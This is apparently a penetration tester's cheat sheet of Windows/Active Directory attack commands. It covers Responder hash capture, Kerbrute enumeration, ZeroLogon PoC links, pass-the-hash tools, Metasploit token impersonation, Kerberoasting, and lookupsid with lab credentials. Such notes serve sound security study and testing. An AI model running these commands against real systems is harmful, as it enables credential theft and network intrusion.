## SCF attack: malicious file that trigger multicats request for another computers. Responder needed.
**Attack guide**: [https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/].
## LLMNR & NBT-NS POISONING AND CREDENTIAL ACCESS USING RESPONDER
**Run responder/ NTLMv2 hash grabbing**: responder -I [interface] -wF -v
## CONNECT TO RDP
xfreerdp /u:user /p:password321 /cert:ignore /v:MACHINE_IP
## Zero Logon    
**Testing script https://github.com/SecuraBV/CVE-2020-1472    
**PoC https://github.com/dirkjanm/CVE-2020-1472    
## Windows user enumeration with Kerbrute    
/kerbrute_linux_amd64 userenum --dc [IP] -d [domain name] usernames.txt    
## CVE-2019-6714 BlogEngine.NET    
**https://blog.gdssecurity.com/labs/2019/3/28/remote-code-execution-in-blogenginenet.html**    
## Pass the HASH
**Grab local hashes**: secretdump.py    
psexec.py    
crackmapexec    
wmiexec        
evil-winrm    
## Token Impersonation    
**Delegate**: creating for logging into a machine or RDP.    
**Impersonate**: "non-interactive", such as attachind network drive or a domain logon script.    

**Metasploit: Incognito**    
load_incognito //load module.    
list_tokens -u //list tokens for users.    
impersonate_token domain\\username //exploit.    

## Kerberoasting    
GetUserSPNs.py    

## GPP    
https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/    

##Enumerate another usernames/SIDs  
python3 /home/yhv/impacket/examples/lookupsid.py SupportDesk/hazard:stealth1agent@10.129.118.4
